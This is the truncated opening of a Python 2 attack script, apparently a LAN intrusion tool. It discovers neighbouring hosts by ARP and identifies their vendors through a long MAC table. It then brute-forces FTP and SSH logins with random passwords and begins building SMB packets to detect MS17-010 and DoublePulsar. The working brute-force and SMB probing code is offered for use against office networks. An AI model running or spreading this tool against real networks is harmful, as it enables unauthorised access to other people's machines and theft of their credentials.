#!/usr/bin/env python2
#-*- coding:utf-8 -*-

__author__='''
[Cs133]
Twitter: @133_cesium
'''
__description__='''
The aim of this is to discover who is online in the neightborhood of the same LAN (at the office for example...) of the user.
Then it checks if some Well Known Ports are open and in listenning mode.

Steps:
------
1st: ARP check on LAN(/24)
2nd: Discovering sequence (Hostname for example, if shared) and port scan
3rd: Attacking attempts by BF upon 22 and 21
4th: Dowloading web interfaces for further actions upon 80 and 443
5th: Checking if the host is vulnerable to MS17-010

Version 3:
----------
MS17-010 detection now embedded.
Many thanks to https://github.com/worawit/MS17-010.

Version 3.5:
------------
MacAddress identification if possible.
'''
__license__='''
<+> Under the terms of the GPL v3 License.
'''


import scapy.route, scapy.config, scapy.layers.l2
import sys, math, errno, socket, logging, requests, struct
from ftplib import FTP
from scapy.all import *
from random import randint
from threading import Thread
from argparse import ArgumentParser
from paramiko import SSHClient, AutoAddPolicy
from string import digits, ascii_lowercase, uppercase, hexdigits, letters, punctuation

known_ports 	= [21,22,222,2222,255,255,80,443,445,8080,8000]
letters_digits  = digits + letters
all		= digits + letters + punctuation
online  	= {}
ips_o,pwd	= [],[]
SYNACK  	= 0x12
flag,ftop	= 0,0
bf_ok		= False
buffersize	= 1024
known_hw_constructor = {
# Virtual environnement -------------------------------------------------------------------------------
	'(VMware ESX 3, Server, Workstation, Player)'		: ['00:50:56', '00:0C:29', '00:05:69'],
	'(Sun xVM VirtualBox)'					: ['08:00:27'],
	'(Microsoft Hyper-V, Virtual Server, Virtual PC)'	: ['00:03:FF'],
	'(Parallells Desktop, Workstation, Server, Virtuozzo)'	: ['00:1C:42'],
	'(Virtual Iron 4)'					: ['00:0F:4B'],
	'(Red Hat Xen / Oracle VM / XenSource / Novell Xen)'	: ['00:16:3E'],

# The rest --------------------------------------------------------------------------------------------
	'(Skyport Systems)'					: ['DC:39:79'],
	'(Shenzhen Guzidi Technology Co.,Ltd)'			: ['B4:7C:29'],
	'(chaowifi.com)'					: ['7C:25:87'],
	'(MEDIA GLOBAL LINKS CO., LTD.)'			: ['04:61:69'],
	'(HiTEM Engineering)'					: ['34:46:6F'],
	'(Shanghai Feixun Communication Co.,Ltd.)'		: ['00:6B:8E'],
	'(Chicony Electronics Co., Ltd.)'			: ['90:7F:61'],
	'(ABB Global Industries and Services Private Limited)'	: ['50:31:AD'],
	'(Impex-Sat GmbH&amp;Co KG)'				: ['90:98:64'],
	'(TP-LINK TECHNOLOGIES CO.,LTD.)'			: ['E0:05:C5', 'A0:F3:C1', '8C:21:0A', 'EC:17:2F', 'EC:88:8F', '14:CF:92', '64:56:01', '14:CC:20', 'BC:46:99', '3C:46:D8', '54:C8:0F'],
	'(Beijing Guang Runtong Technology Development Company co.,Ltd)' : ['58:53:C0'],
	'(HUIZHOU MAORONG INTELLIGENT TECHNOLOGY CO.,LTD)'	: ['94:F1:9E'],
	'(Aquantia Corporation)'				: ['30:0E:E3'],
	'(LAVA INTERNATIONAL(H.K) LIMITED)'			: ['AC:56:2C'],
	'(Cambrionix Ltd)'					: ['A4:24:DD'],
	'(G24 Power Limited)'					: ['C4:9E:41'],
	'(Tallac Networks)'					: ['94:C0:38'],
	'(Mercedes-Benz USA, LLC)'				: ['3C:CE:15'],
	'(ShangHai sunup lighting CO.,LTD)'			: ['78:B3:B9'],
	'(NEC Corporation)'					: ['8C:DF:9D'],
	'(Electrocompaniet A.S.)'				: ['AC:67:6F'],
	'(Intellisis)'						: ['80:A1:AB'],
	'(Mciao Technologies, Inc.)'				: ['C4:9F:F3'],
	'(CloudBerry Technologies Private Limited)'		: ['34:02:9B'],
	'(Sonos, Inc.)'						: ['5C:AA:FD'],
	'(Technische Alternative GmbH)'				: ['3C:CD:5A'],
	'(Intel Corporation)'					: ['00:03:47', '00:11:75'],
	'(TOP-ACCESS ELECTRONICS CO LTD)'			: ['34:0A:22'],
	'(Atomic Rules LLC)'					: ['DC:3C:F6'],
	'(HTC Corporation)'					: ['80:7A:BF', '90:E7:C4', '7C:61:93'],
	'(Rosslare Enterprises Limited)'			: ['F8:BC:41'],
	'(HUAWEI TECHNOLOGIES CO.,LTD)'				: ['48:AD:08', '2C:AB:00', '00:E0:FC', '24:DF:6A', '00:9A:CD', '80:38:BC', 'D4:40:F0', '64:A6:51', 'E8:CD:2D', 'AC:E2:15', 'EC:23:3D', '78:F5:FD', '80:B6:86', '10:C6:1F', '88:53:D4', '0C:37:DC', 'BC:76:70', '24:DB:AC', '0C:45:BA', 'CC:A2:23', 'E8:08:8B', '60:E7:01', 'AC:85:3D', '74:88:2A', '78:D7:52', 'E0:24:7F', '00:46:4B', '70:7B:E8', '54:89:98', '08:19:A6', '3C:F8:08', 'B4:15:13', '28:31:52', 'DC:D2:FC', '28:5F:DB', '40:4D:8E', '78:1D:BA', '00:1E:10', 'D0:3E:5C', 'F8:98:B9', '2C:CF:58', 'E4:C2:D1', '88:A2:D7', '3C:47:11'],
	'(Nishiyama Industry Co.,LTD.)'				: ['70:AF:25'],
	'(Beijing SHENQI Technology Co., Ltd.)'			: ['D8:9A:34'],
	'(WiFiSong)'						: ['38:C7:0A'],
	'(ECHOSENS)'						: ['F0:D6:57'],
	'(Ilshin Elecom)'					: ['1C:EE:E8'],
	'(Welgate Co., Ltd.)'					: ['4C:26:E7'],
	'(D-Link International)'				: ['1C:BD:B9', '90:94:E4', '28:10:7B', '1C:7E:E5', 'C4:A8:1D', 'F8:E9:03', '6C:19:8F'],
	'(Experimental Factory of Scientific Engineering and Special Design Department)' : ['DC:E5:78'],
	'(Wistron InfoComm(Kunshan)Co.,Ltd.)'			: ['54:EE:75'],
	'(Sysorex Global Holdings)'				: ['04:53:D5'],
	'(Yangzhou ChangLian Network Technology Co,ltd.)'	: ['20:5C:FA'],
	'(Step forward Group Co., Ltd.)'			: ['DC:2F:03'],
	'(Electronics Company Limited)'				: ['2C:1A:31'],
	'(Koubachi AG)'						: ['8C:05:51'],
	'(samtec automotive electronics & software GmbH)'	: ['08:CD:9B'],
	'(ShenZhen Protruly Electronic Ltd co.)'		: ['60:18:2E'],
	'(KEISOKUKI CENTER CO.,LTD.)'				: ['C4:92:4C'],
	'(R L Drake)'						: ['F0:3F:F8'],
	'(Telegartner Karl Gartner GmbH)'			: ['44:11:C2'],
	'(Fujian Great Power PLC Equipment Co.,Ltd)'		: ['60:C1:CB'],
	'(Comark Interactive Solutions)'			: ['00:03:DD'],
	'(Zhejiang Hite Renewable Energy Co.,LTD)'		: ['74:C6:21'],
	'(Optek Digital Technology company limited)'		: ['94:9F:3F'],
	'(Instituto Nacional de TecnologÃ­a Industrial)'	: ['78:EB:39'],
	'(Qingdao Eastsoft Communication Technology Co.,LTD)'	: ['C0:DC:6A'],
	'(Microsoft Mobile Oy)'					: ['38:F2:3E'],
	'(GOPEACE Inc.)'					: ['C4:AD:F1'],
	'(ShengHai Electronics (Shenzhen) Ltd)'			: ['4C:AE:31'],
	'(TangoWiFi.com)'					: ['D4:52:2A'],
	'(Vodafone Omnitel B.V.)'				: ['64:59:F8'],
	'(OVH)'							: ['2C:08:1C'],
	'(SKG Electric Group(Thailand) Co., Ltd.)'		: ['EC:E2:FD'],
	'(Pep Digital Technology (Guangzhou) Co., Ltd)'		: ['98:77:70'],
	'(EnvyLogic Co.,Ltd.)'					: ['9C:3E:AA'],
	'(Newbridge Technologies Int. Ltd.)'			: ['60:48:26'],
	'(Shenzhen Yourf Kwan Industrial Co., Ltd)'		: ['40:9B:0D'],
	'(Greenvity Communications)'				: ['84:86:F3'],
	'(Huizhou Super Electron Technology Co.,Ltd.)'		: ['7C:FF:62'],
	'(Hangzhou Xueji Technology Co., Ltd.)'			: ['D8:48:EE'],
	'(Shenzhen Xin KingBrand enterprises Co.,Ltd)'		: ['28:FC:F6'],
	'(D-Link Corporation)'					: ['00:50:BA', '00:17:9A'],
	'(Seeed Technology Inc.)'				: ['2C:F7:F1'],
	'(JinQianMao  Technology Co.,Ltd.)'			: ['F0:0D:5C'],
	'(Invensys Controls UK Limited)'			: ['FC:FE:C2'],
	'(Jiangxi Hongpai Technology Co., Ltd.)'		: ['D4:45:E8'],
	'(iPort)'						: ['DC:82:F6'],
	'(Beijing Autelan Technology Co.,Ltd)'			: ['4C:48:DA'],
	'(Suzhou Chi-tek information technology Co., Ltd)'	: ['F8:66:01'],
	'(Vital Connect, Inc.)'					: ['B0:08:BF'],
	'(Acoustic Stream)'					: ['0C:1A:10'],
	'(Nokia Corporation)'					: ['A4:81:EE', '4C:7F:62'],
	'(Shanghai DareGlobal Technologies Co.,Ltd)'		: ['74:18:65'],
	'(Shenzhen ViewAt Technology Co.,Ltd. )'		: ['E0:43:DB'],
	'(Panasonic Taiwan Co.,Ltd.)'				: ['34:F6:D2'],
	'(TRENDnet, Inc.)'					: ['3C:8C:F8'],
	'(Mist Systems, Inc.)'					: ['5C:5B:35'],
	'(Scientech Materials Corporation)'			: ['20:12:D5'],
	'(Cambridge Mobile Telematics, Inc.)'			: ['4C:B8:2C'],
	'(Parallel Wireless, Inc)'				: ['2C:A5:39'],
	'(Shanghai Baud Data Communication Co.,Ltd.)'		: ['84:79:73'],
	'(Viptela, Inc)'					: ['80:B7:09'],
	'(Hitron Technologies. Inc)'				: ['00:07:D8'],
	'(Shenzhen Jin Yun Video Equipment Co., Ltd.)'		: ['6C:02:73'],
	'(Zioncom Electronics (Shenzhen) Ltd.)'			: ['F4:28:53'],
	'(DirectPacket Research, Inc,)'				: ['74:2E:FC'],
	'(Roqos, Inc.)'						: ['A8:C8:7F'],
	'(Rigado, LLC)'						: ['94:54:93'],
	'(Systech Electronics Ltd.)'				: ['A8:D0:E3'],
	'(ATN International Limited)'				: ['34:28:F0'],
	'(Leading Public Performance Co., Ltd.)'		: ['F4:47:13'],
	'(ASUSTek COMPUTER INC.)'				: ['00:E0:18', '00:0C:6E', '00:1B:FC', '00:1E:8C', '00:15:F2', '00:23:54', '00:1F:C6', 'F8:32:E4', '38:2C:4A'],
	'(INNO S)'						: ['70:C7:6F'],
	'(ServerNet S.r.l.)'					: ['AC:06:C7'],
	'(Shanghai Reallytek Information Technology  Co.,Ltd)'	: ['80:19:67'],
	'(Shenzhen RF Technology Co., Ltd)'			: ['8C:18:D9'],
	'(Chuango Security Technology Corporation)'		: ['84:DF:19'],
	'(Planet BingoÂ® â€” 3rd Rock GamingÂ®)'		: ['08:0A:4E'],
	'(Philips Oral Healthcare, Inc.)'			: ['24:E5:AA'],
	'(Aitexin Technology Co., Ltd)'				: ['30:B5:F1'],
	'(Cognitec Systems GmbH)'				: ['3C:35:56'],
	'(Cisco SPVTG)'						: ['44:E0:8E', '18:59:33', 'E4:48:C7', '24:76:7D', '2C:AB:A4', '00:19:47', '00:22:CE', 'F4:4B:2A', '74:54:7D'],
	'(SHENZHEN FAST TECHNOLOGIES CO.,LTD)'			: ['70:4E:66'],
	'(Avotek corporation)'					: ['88:E6:03'],
	'(Hyundai ESG)'						: ['94:51:BF'],
	'(ATP Electronics, Inc.)'				: ['14:13:57'],
	'(AzureWave Technology Inc.)'				: ['AC:89:95'],
	'(Liling FullRiver Electronics & Technology Ltd)'	: ['94:05:B6'],
	'(King Slide Technology CO., LTD.)'			: ['7C:A2:37'],
	'(Junilab, Inc.)'					: ['08:3A:5C'],
	'(Research Centre Module)'				: ['EC:17:66'],
	'(Shenzhen Linghangyuan Digital Technology Co.,Ltd.)'	: ['34:F0:CA'],
	'(Saffron Solutions Inc)'				: ['84:28:5A'],
	'(COMPAL INFORMATION (KUNSHAN) CO., LTD.)'		: ['F0:76:1C'],
	'(OOO NPP Systemotechnika-NN)'				: ['6C:2C:06'],
	'(Intel Corporate)'					: ['00:13:E8', '00:13:02', 'E4:F8:9C', 'A4:02:B9', '4C:34:88'],
	'(Bosung Electronics Co., Ltd.)'			: ['1C:AD:D1'],
	'(Rain Bird Corporation)'				: ['4C:A1:61'],
	'(IMS Messsysteme GmbH)'				: ['1C:48:40'],
	'(Shenzhen Linkworld Technology Co,.LTD)'		: ['54:A3:1B'],
	'(SHEN ZHEN HENG SHENG HUI DIGITAL TECHNOLOGY CO.,LTD)'	: ['EC:3C:5A'],
	'(SIFROM Inc.)'						: ['44:C3:06'],
	'(Google, Inc.)'					: ['3C:5A:B4', '00:1A:11'],
	'(COL GIOVANNI PAOLO SpA)'				: ['20:BB:76'],
	'(LG Innotek)'						: ['E8:F2:E2'],
	'(OMRON HEALTHCARE Co., Ltd.)'				: ['B0:49:5F'],
	'(Zhejiang Everbright Communication Equip. Co,. Ltd)'	: ['C0:4A:09'],
	'(shenzhen yunmao information technologies co., ltd)'	: ['94:D6:0E'],
	'(Automatic Bar Controls Inc.)'				: ['34:E4:2A'],
	'(Minxon Hotel Technology INC.)'			: ['E4:F9:39'],
	'(AIRTAME ApS)'						: ['38:4B:76'],
	'(Nanomegas)'						: ['90:17:9B'],
	'(CTR SRL)'						: ['2C:22:8B'],
	'(SHENZHEN XIN FEI JIA ELECTRONIC CO. LTD.)'		: ['88:1B:99'],
	'(Dalian Netmoon Tech Develop Co.,Ltd)'			: ['88:29:50'],
	'(MIC Technology Group)'				: ['30:C7:50'],
	'(Shenzhen Prifox Innovation Technology Co., Ltd.)'	: ['30:A2:43'],
	'(Beijing Infosec Technologies Co., LTD.)'		: ['E8:34:3E'],
	'(SHENZHEN SPACETEK TECHNOLOGY CO.,LTD)'		: ['20:C0:6D'],
	'(Yaojin Technology(Shenzhen)Co.,Ltd)'			: ['F8:84:79'],
	'(Toshiba)'						: ['78:D6:B2'],
	'(Davit Solution co.)'					: ['54:FF:82'],
	'(Cisco-Linksys, LLC)'					: ['00:12:17', '00:0C:41', '00:0F:66'],
	'(Maxwell Forest)'					: ['74:F4:13'],
	'(Control Solutions LLC)'				: ['E4:A3:87'],
	'(Shenzhen Ferex Electrical Co.,Ltd)'			: ['7C:2B:E1'],
	'(Top Victory Electronics (Taiwan) Co., Ltd.)'		: ['18:65:71'],
	'(NietZsche enterprise Co.Ltd.)'			: ['44:29:38'],
	'(Shenzhen Primestone Network Technologies.Co., Ltd.)'	: ['C8:C5:0E'],
	'(ELECOM CO.,LTD.)'					: ['BC:5C:4C'],
	'(Thread Technology Co., Ltd)'				: ['30:F7:D7'],
	'(Liteon, Inc.)'					: ['24:5B:F0'],
	'(Silca Spa)'						: ['38:08:FD'],
	'(Polyera)'						: ['FC:33:5F'],
	'(Vuzix / Lenovo)'					: ['60:99:D1'],
	'(DGS Denmark A/S)'					: ['00:F8:71'],
	'(Fike Corporation)'					: ['D4:32:66'],
	'(KMB systems, s.r.o.)'					: ['58:21:36'],
	'(Four systems Co.,Ltd.)'				: ['74:91:BD'],
	'(Jide Technology (Hong Kong) Limited)'			: ['40:9F:87'],
	'(BURG-WÃ„CHTER KG)'					: ['30:42:25'],
	'(bioMÃ©rieux Italia S.p.A.)'				: ['D8:60:B0'],
	'(SHENZHEN CHUANGWEI-RGB ELECTRONICS CO.,LTD)'		: ['BC:EC:23', 'BC:83:A7'],
	'(Acacia Communications)'				: ['7C:B2:5C'],
	'(Maike Industry(Shenzhen)CO.,LTD)'			: ['30:77:CB'],
	'(SB SYSTEMS Co.,Ltd)'					: ['F8:5B:9C'],
	'(Gemtek Technology Co., Ltd.)'				: ['1C:49:7B'],
	'(ROXTON Ltd.)'						: ['78:53:F2'],
	'(Qiku Internet Network Scientific (Shenzhen) Co., Ltd.)' : ['74:AC:5F'],
	'(Cisco Systems, Inc)'					: ['CC:46:D6', '58:AC:78', '00:10:7B', '00:90:6D', '00:90:BF', '00:50:80', 'F4:CF:E2', '50:1C:BF', '88:F0:31', '50:87:89', '38:1C:1A', 'F4:0F:1B', 'BC:67:1C', 'A0:EC:F9', 'D4:6D:50', '1C:E8:5D', 'C4:72:95', 'A0:55:4F', '84:B8:02', 'BC:C4:93', 'F0:29:29', 'EC:E1:A9', '7C:69:F6', 'C0:8C:60', 'C0:25:5C', '88:5A:92', 'E4:C7:22', 'C0:7B:BC', '00:90:F2', '00:17:3B', '00:40:0B', '00:60:09', '00:60:47', '00:06:C1', '00:E0:14', '00:E0:1E', 'AC:F2:C5', '00:10:FF', '34:BD:C8', '54:A2:74', '58:97:BD', '04:6C:9D'],
	'(Source Chain)'					: ['58:F4:96'],
	'(AHN INC.)'						: ['D8:81:CE'],
	'(Castlenet Technology Inc.)'				: ['FC:4A:E9'],
	'(iRule LLC)'						: ['24:4F:1D'],
	'(Linctronix Ltd,)'					: ['30:E0:90'],
	'(Reacheng Communication Technology Co.,Ltd)'		: ['10:FA:CE'],
	'(Bluebank Communication Technology Co.Ltd)'		: ['A4:A4:D3'],
	'(HangZhou KuoHeng Technology Co.,ltd)'			: ['30:FF:F6'],
	'(Shenzhen TINNO Mobile Technology Corp.)'		: ['D8:3C:69'],
	'(Neterix)'						: ['44:35:6F'],
	'(BUFFALO.INC)'						: ['00:0D:0B', '00:07:40', '00:24:A5', 'DC:FB:02'],
	'(Hitachi Maxell, Ltd., Optronics Division)'		: ['3C:B7:92'],
	'(SHENZHEN BOOMTECH INDUSTRY CO.,LTD)'			: ['E8:07:BF'],
	'(Poynt Co.)'						: ['88:C2:42'],
	'(Charles River Laboratories)'				: ['70:BF:3E'],
	'(Cochlear Limited)'					: ['84:77:78'],
	'(EQUES Technology Co., Limited)'			: ['E0:D3:1A'],
	'(D-Link Internat)'					: ['B0:C5:54'],
	'(Oilfind International LLC)'				: ['3C:A3:1A'],
	'(TAKT Corporation)'					: ['50:50:65'],
	'(Letv Mobile and Intelligent Information Technology (Beijing) Corporation Ltd.)' : ['84:73:03'],
	'(NET RULES TECNOLOGIA EIRELI)'				: ['48:54:15'],
	'(innodisk Corporation)'				: ['24:69:3E'],
	'(Glory Star Technics (ShenZhen) Limited)'		: ['40:7F:E0'],
	'(Sagemcom Broadband SAS)'				: ['18:62:2C', '7C:03:D8', 'E8:F1:B0', '34:8A:AE'],
	'(New Singularity International Technical Development Co.,Ltd)'	: ['5C:E7:BF'],
	'(Goyoo Networks Inc.)'					: ['C8:A9:FC'],
	'(Suzhou Torchstar Intelligent Technology Co.,Ltd)'	: ['88:CB:A5'],
	'(AXPRO Technology Inc.)'				: ['A0:D1:2A'],
	'(Lupine Lighting Systems GmbH)'			: ['68:12:95'],
	'(Apple, Inc.)'						: ['00:CD:FE', '18:AF:61', 'CC:44:63', '6C:72:E7', 'CC:C7:60', '08:74:02', '28:5A:EB', '28:F0:76', '44:D8:84', 'EC:85:2F', '28:6A:BA', '70:56:81', '7C:D1:C3', 'F0:DC:E2', 'B0:65:BD', 'A8:20:66', 'BC:67:78', '68:96:7B', '84:85:06', 'B4:F0:AB', '10:DD:B1', '04:F7:E4', '34:C0:59', 'F0:D1:A9', 'F8:27:93', 'AC:FD:EC', 'D0:E1:40', '8C:7C:92', '78:31:C1', 'F4:37:B7', '54:AE:27', '64:76:BA', '84:B1:53', '78:3A:84', '2C:BE:08', '24:E3:14', '60:FE:C5', '00:A0:40', 'BC:3B:AF', '78:6C:1C', '04:15:52', '38:48:4C', '70:11:24', 'C8:6F:1D', '68:5B:35', '38:0F:4A', '30:10:E4', '04:DB:56', '88:1F:A1', '04:E5:36', '10:9A:DD', '40:A6:D9', '7C:F0:5F', 'A4:B1:97', '0C:74:C2', '40:30:04', '48:60:BC', '50:EA:D6', '28:E0:2C', '60:C5:47', '7C:11:BE', '00:3E:E1', '68:D9:3C', '2C:F0:EE', '84:78:8B', '6C:94:F8', '70:3E:AC', 'C0:1A:DA', '34:36:3B', 'C8:1E:E7', '9C:FC:01', '00:0D:93', '00:1C:B3', '64:B9:E8', '34:15:9E', '58:B0:35', 'F0:B4:79', 'AC:BC:32'],
	'(Loxley Public Company Limited)'			: ['E8:87:A3'],
	'(Prophet Electronic Technology Corp.,Ltd)'		: ['68:6E:48'],
	'(zte corporation)'					: ['74:A7:8E', '84:74:2A', '68:1A:B2', '6C:A7:5F', '70:9F:2D', 'EC:1D:7F', '34:DE:34'],
	'(ZTLX Network Technology Co.,Ltd)'			: ['EC:EE:D8'],
	'(P2 Mobile Technologies Limited)'			: ['64:9A:12'],
	'(Sercomm Corporation)'					: ['D4:21:22'],
	'(DriveScale, Inc.)'					: ['68:36:B5'],
	'(INDUSTRIAS UNIDAS SA DE CV)'				: ['94:8E:89'],
	'(Beijing Huafei Technology Co., Ltd.)'			: ['BC:9C:C5'],
	'(Husqvarna AB)'					: ['94:BB:AE'],
	'(MMPC Inc.)'						: ['F4:28:33'],
	'(Wisol)'						: ['70:2C:1F'],
	'(Vubiq Networks, Inc.)'				: ['68:28:F6'],
	'(Davit System Technology Co., Ltd.)'			: ['48:6E:FB'],
	'(Biosoundlab Co., Ltd.)'				: ['9C:BE:E0'],
	'(GatesAir, Inc)'					: ['7C:6A:C3'],
	'(IDEO Security Co., Ltd.)'				: ['E8:16:2B'],
	'(Integrated Device Technology (Malaysia) Sdn. Bhd.)'	: ['24:05:F5'],
	'(Bointec Taiwan Corporation Limited)'			: ['20:A7:87'],
	'(Suzhou HOTEK  Video Technology Co. Ltd)'		: ['AC:11:D3'],
	'(SkyDisk, Inc.)'					: ['9C:BD:9D'],
	'(Sony Mobile Communications AB)'			: ['BC:6E:64'],
	'(Shenzhen UTEPO Tech Co., Ltd.)'			: ['C4:08:80'],
	'(SourcingOverseas Co. Ltd)'				: ['28:BC:18'],
	'(Ciena Corporation)'					: ['2C:39:C1'],
	'(ruwido austria gmbh)'					: ['1C:A2:B1'],
	'(NEC Platforms, Ltd.)'					: ['C0:25:A2'],
	'(Guangzhou Younghead Electronic Technology Co.,Ltd)'	: ['34:B7:FD'],
	'(ITTIM Technologies)'					: ['B0:41:1D'],
	'(DONGGUAN HELE ELECTRONICS CO., LTD)'			: ['1C:52:16'],
	'(Penguin Computing)'					: ['6C:64:1A'],
	'(Hewlett Packard)'					: ['3C:D9:2B', '9C:8E:99', 'B4:99:BA', '1C:C1:DE', 'F4:CE:46', '00:1C:C4', '00:25:B3', '00:18:71', '00:0B:CD', '00:0E:7F', '00:0F:20', '00:11:0A', '00:13:21', '00:16:35', '00:17:A4', '00:08:02', '00:08:83', 'C4:34:6B', '8C:DC:D4', '34:64:A9', 'D4:C9:EF', 'A4:5D:36', 'A0:D3:C1', '40:A8:F0', '6C:3B:E5', '08:2E:5F', '28:92:4A', '10:60:4B', '30:8D:99', '00:30:C1', 'FC:3F:DB'],
	'(TRP Systems BV)'					: ['DC:DC:07'],
	'(MEXUS CO.,LTD)'					: ['24:D1:3F'],
	'(Sino-Telecom Technology Co.,Ltd.)'			: ['60:E6:BC'],
	'(Murata Manufacturing Co., Ltd.)'			: ['00:21:E8', '00:60:57', '00:AE:FA'],
	'(Microsoft Corporation)'				: ['48:50:73', '74:E2:8C', '84:63:D6', 'D4:8F:33'],
	'(Stage One International Co., Ltd.)'			: ['E0:36:E3'],
	'(Routerboard.com)'					: ['E4:8D:8C'],
	'(SHENZHEN MERCURY COMMUNICATION TECHNOLOGIES CO.,LTD.)': ['1C:60:DE', '6C:59:40', 'F4:EE:14'],
	'(Custom Control Concepts)'				: ['60:81:2B'],
	'(Private)'						: ['00:84:ED', '90:6F:18', 'B0:EC:E1'],
	'(Esan electronic co.)'					: ['F0:22:4E'],
	'(Micro-Star INTL CO., LTD.)'				: ['D8:CB:8A'],
	'(ALPS ELECTRIC CO.,LTD.)'				: ['00:02:C7', '04:76:6E'],
	'(Network Instruments)'					: ['08:2C:B0'],
	'(Qolsys Inc.)'						: ['3C:31:78']
}

logging.basicConfig(format='%(asctime)s %(levelname)-5s %(message)s',
			datefmt='%Y-%m-%d %H:%M:%S',
			level=logging.DEBUG)
logger = logging.getLogger(__name__)
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


# BF part ==========================================================================================
def print_fmt(sentence):
	lgth = len(sentence)
	print sentence + '\n' + '-'*(lgth-10)

def pwd_alpha(lgr, mode):
	if mode == 'lower':
		return ''.join(ascii_lowercase[randint(0,len(ascii_lowercase)-1)] for i in range(int(lgr)))
	elif mode == 'upper':
		return ''.join(uppercase[randint(0,len(uppercase)-1)] for i in range(int(lgr)))
	elif mode == 'digits':
		return ''.join(digits[randint(0,len(digits)-1)] for i in range(int(lgr)))
	elif mode == 'hex':
		return ''.join(hexdigits[randint(0,len(hexdigits)-1)] for i in range(int(lgr)))
	elif mode == 'all':
		return ''.join(all[randint(0,len(all)-1)] for i in range(int(lgr)))
	else:
		return ''.join(letters_digits[randint(0,len(letters_digits)-1)] for i in range(int(lgr)))

def generate(mode, lgr):
	stop = False
	if mode == 'lower':
		len_mode = pow(len(ascii_lowercase), int(lgr))
	elif mode == 'upper':
		len_mode = pow(len(uppercase), int(lgr))
	elif mode == 'digits':
		len_mode = pow(len(digits), int(lgr))
	elif mode == 'hex':
		len_mode = pow(len(hexdigits), int(lgr))
	elif mode == 'all':
		len_mode = pow(len(all), int(lgr))
	else:
		len_mode = pow(len(lc_digits), int(lgr))
	try:
		while stop != True:
			psswd = pwd_alpha(lgr, mode)
			if psswd not in pwd: pwd.append(psswd)
			sys.stdout.write('\r\033[96m[BF]\033[0m Remplissage du dictionnaire [/!\\ en mémoire] : ' +
					 str(len(pwd)) + ' / '+ str(len_mode))
			sys.stdout.flush()
			if len(pwd) == len_mode:
				stop = True
				sys.stdout.write('\n\033[96m[BF]\033[0m Dictionnaire généré en totalité.\n')
	except KeyboardInterrupt:
		sys.stdout.write('\n\033[96m[BF]\033[0m Génération interrompue avec succès. Longueur : %d.\n\n' % len(pwd))
		return pwd
	return pwd

def detonate(log, addr, psswd, essai):
	global ftop
	trig = FTP(addr)
	try:
		sys.stdout.write('\r\033[96m[*]\033[0m Essai nb*' + str(essai) + ' : ' + psswd)
		sys.stdout.flush()
		ret = trig.login(user=log,passwd=psswd)
		trig.quit()
		if "successful" in ret:
			ftop = 1
			sys.stdout.write('\n\n\033[91m[+]\033[0m FTP YEAH : ' + addr + ' --> ' + psswd + '\n\n')
	except:
		trig.close()

def ssh_conn(log, addr, passwd, essai, port):
	global flag
	try:
		client = SSHClient()
		client.set_missing_host_key_policy(AutoAddPolicy())
		sys.stdout.write('\r\033[96m[SSH]\033[0m Essai nb*' + str(essai) + ' : ' + passwd)
		sys.stdout.flush()
		client.connect(addr,
			username=log,
			password=psswd,
			timeout=10,
			port= port,
			look_for_keys=False)
		print '\n\n\033[91m[SSH]\033[0m SSH YEAH : ' + addr + ' --> ' + psswd + '\n\n'
		flag = 1
	except:
		pass

# HTTP / HTTPS part ==============================================================================
def query(port, dst):
	try:
		if port == 443:
			url = 'https://{}'.format(dst)
		else:
			url = 'http://{}:{}'.format(dst, port)
		cooki	= {'spip_session':pwd_alpha(16, 'alpha')}
		token	= {'token':pwd_alpha(16, 'alpha')}
		headers = {'content-type':'application/json'}
		r = requests.get(url, headers=headers, verify=False)
		logger.info("\033[92m[STATUS]\033[0m {}: \033[91m{}\033[0m".format(dst, r.status_code))
		return r.text.encode('utf-8')
	except Exception as e:
		logger.error("\033[91m[-]\033[0m Erreur rencontrée lors de la création de la requète {}:{} : {}".format(dst,port,e.strerror))
		return None

# SMB part =======================================================================================
def generate_smb_proto_payload(*protos):
	hexdata = []
	for proto in protos:
		hexdata.extend(proto)
	return "".join(hexdata)

def calculate_doublepulsar_xor_key(s):
	"""Calculate Doublepulsar Xor Key
	"""
	x = (2 * s ^ (((s & 0xff00 | (s << 16)) << 8) | (((s >> 16) | s & 0xff0000) >> 8)))
	x = x & 0xffffffff  # this line was added just to truncate to 32 bits
	return x

def negotiate_proto_request():
	"""Generate a negotiate_proto_request packet.
	"""
	logger.debug("Generate negotiate request")
	netbios = [
			'\x00',				# 'Message_Type'
		   	'\x00\x00\x54']			# 'Length'
	smb_header = [
			'\xFF\x53\x4D\x42',		# 'server_component': .SMB
			'\x72',				# 'smb_command': Negotiate Protocol
			'\x00\x00\x00\x00',		# 'nt_status'
			'\x18',				# 'flags'
			'\x01\x28',			# 'flags2'
			'\x00\x00',			# 'process_id_high'
			'\x00\x00\x00\x00\x00\x00\x00\x00',  # 'signature'
			'\x00\x00',			# 'reserved'
			'\x00\x00',			# 'tree_id'
			'\x2F\x4B',			# 'process_id'
			'\x00\x00',			# 'user_id'
			'\xC5\x5E']			# 'multiplex_id'
	negotiate_proto_request = [
			'\x00',				# 'word_count'
			'\x31\x00',			# 'byte_count'
			# Requested Dialects
			'\x02',				# 'dialet_buffer_format'
			'\x4C\x41\x4E\x4D\x41\x4E\x31\x2E\x30\x00',   # 'dialet_name': LANMAN1.0
			'\x02',				# 'dialet_buffer_format'
			'\x4C\x4D\x31\x2E\x32\x58\x30\x30\x32\x00',   # 'dialet_name': LM1.2X002
			'\x02',				# 'dialet_buffer_format'
			'\x4E\x54\x20\x4C\x41\x4E\x4D\x41\x4E\x20\x31\x2E\x30\x00',  # 'dialet_name3': NT LANMAN 1.0
			'\x02',				# 'dialet_buffer_format'
			'\x4E\x54\x20\x4C\x4D\x20\x30\x2E\x31\x32\x00']   # 'dialet_name4': NT LM 0.12
	return generate_smb_proto_payload(netbios, smb_header, negotiate_proto_request)

def session_setup_andx_request():
	"""Generate session setuo andx request.
	"""
	logger.debug("Generate session setup andx request")
	netbios = [
			'\x00',				# 'Message_Type'
			'\x00\x00\x63']			# 'Length'
	smb_header = [
			'\xFF\x53\x4D\x42', 		# 'server_component': .SMB
			'\x73',				# 'smb_command': Session Setup AndX
			'\x00\x00\x00\x00', 		# 'nt_status'
			'\x18',				# 'flags'
			'\x01\x20',			# 'flags2'
			'\x00\x00',			# 'process_id_high'
			'\x00\x00\x00\x00\x00\x00\x00\x00',  # 'signature'
			'\x00\x00',			# 'reserved'
			'\x00\x00',			# 'tree_id'
			'\x2F\x4B',			# 'process_id'
			'\x00\x00',			# 'user_id'
